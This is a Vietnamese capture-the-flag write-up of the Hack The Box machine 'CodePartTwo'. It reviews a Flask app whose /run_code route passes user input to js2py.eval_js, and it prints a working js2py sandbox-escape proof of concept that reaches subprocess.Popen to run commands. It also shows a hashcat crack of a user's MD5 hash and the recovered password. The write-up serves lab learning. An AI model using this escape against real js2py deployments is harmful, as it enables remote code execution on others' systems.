Linux - easy

<img width="1410" height="481" alt="{D6C8BA04-1E7B-4314-BC52-2DAA7B5A0DB3}" src="https://github.com/user-attachments/assets/959d42b5-1456-4042-80a3-4c6386aa287e" />

Giao diện tại dịch vụ HTTP port 8000 có chức năng login, register, và từ khóa cho thấy "Open source"

<img width="1888" height="694" alt="image" src="https://github.com/user-attachments/assets/ddea5206-17a2-48b5-b556-7e4cbb775ba7" />

Có thể tải source về review, có vẻ là audit code để tìm bug RCE? https://github.com/h2oa/My-blogs/blob/main/Hackthebox/Machines/codeparttwo.zip

Code là Python, sử dụng thư viện flask, khả năng SSTI? Sau khi đăng ký và login có 1 chức năng duy nhất tạo code và chạy, khả năng lỗ hổng ở đây:

<img width="1754" height="748" alt="{77BF5321-644B-45F0-8838-CC3B05C71716}" src="https://github.com/user-attachments/assets/3954a62d-b397-456f-b4be-cdf7ec28e395" />

Phần code của route `/run_code`:

```
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

Sử dụng `js2py.eval_js(code)` rất khả nghi, tìm kiếm thấy có RCE ở hàm này với phiên bản `<=0.74`, chính xác là phiên bản đang sử dụng:

<img width="835" height="233" alt="image" src="https://github.com/user-attachments/assets/f1f7e6a5-1e61-4cd1-87de-8f4c209a1326" />

Tìm kiếm một vài POC trên mạng thấy https://gist.github.com/win3zz/159610d3269f39f66a4da5ddf5150e2d dùng được, trực tiếp RCE:

```
function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

let obj = Object.getOwnPropertyNames({}).__getattribute__("__getattribute__")("__class__").__base__
output = findpopen(obj)("id", -1, null, -1, -1, -1, null, null, true).communicate()
console.log(output)
```

<img width="1839" height="921" alt="{9C595F46-E51A-46CD-87B9-C23392B26855}" src="https://github.com/user-attachments/assets/6a775490-88b7-4b0e-862a-953bb199f24a" />

<img width="1011" height="448" alt="{E55FB62C-F89F-43A8-832A-FC633374A00A}" src="https://github.com/user-attachments/assets/943ec952-db2f-4956-93de-416dcc4522f1" />

<img width="1087" height="153" alt="{077AE69B-92DD-433D-A3DD-34B0F09945A5}" src="https://github.com/user-attachments/assets/bed25308-7157-47e7-a55c-248cbd81a64a" />

User hiện tại là `app`, không vào được user `marco`.

<img width="1085" height="278" alt="{95D6AD56-3903-4A39-AD55-C4D7670989C1}" src="https://github.com/user-attachments/assets/0ea71f53-6e85-43f4-a14c-7f933f5bf855" />

<img width="1638" height="382" alt="{D0C932B7-0785-4FF5-8E89-4BEB79868931}" src="https://github.com/user-attachments/assets/877843cb-3f66-4205-a5f2-d76875ad42ac" />

Password trong db hash bằng MD5, không crack được pass của acc `marco`. :)))) ok vừa đi kiếm được hint là phải crack md5 ... 

```
hashcat -a 0 -m 0 649c9d65a206a75f5abe509fe128bce5 --show
649c9d65a206a75f5abe509fe128bce5:sweetangelbabylove
```

<img width="1082" height="174" alt="{EE0CC122-EF5A-4D30-8844-62D330DEEB10}" src="https://github.com/user-attachments/assets/4973f8f0-8f1d-4a95-8845-8f966329da26" />

<img width="1119" height="300" alt="{E013B6A9-EF0A-45B3-BE45-A84A62DABEA3}" src="https://github.com/user-attachments/assets/e94dbcd0-59a2-4c5f-bca4-a43425339a49" />

Check `sudo -l`:

<img width="1232" height="204" alt="{597F7B23-32CD-434D-A9CC-D76162AB0EB1}" src="https://github.com/user-attachments/assets/46b12197-abb0-4750-8d7c-179204fe2b27" />

User có thể thực hiện quyền sudo với file `/usr/local/bin/npbackup-cli`

